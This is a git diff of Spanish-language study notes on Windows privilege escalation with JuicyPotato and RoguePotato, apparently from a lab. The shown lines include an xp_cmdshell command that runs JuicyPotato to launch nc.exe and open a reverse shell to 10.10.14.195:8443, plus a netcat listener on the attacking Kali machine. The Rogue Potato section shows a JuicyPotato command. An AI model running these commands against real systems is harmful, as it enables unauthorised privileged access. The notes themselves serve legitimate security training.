@@ -33,8 +33,11 @@
         - `-p c:\windows\system32\cmd.exe` es la ruta de la binary que se va a ejecutar.
         - `-a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"` es la argumento que se va a pasar a la binary que se va a ejecutar.
         - `-t *` es el token de servicio que se va a utilizar.
+
+
 ### Rogue Potato
 - RoguePotato es un script de windows que nos permite obtener un token de servicio con privilegios elevados.
+
 ```PowerShell
 SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.195 8443 -e cmd.exe" -t *
 output                                                       
@@ -57,6 +60,8 @@ NULL
 
 SQL (WINLPE-SRV01\sql_dev  dbo@master)> 
 ```
+
+- Ahora en nuestra maquina atacante podemos escuchar en el puerto 8443.
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ sudo nc -lvnp 8443
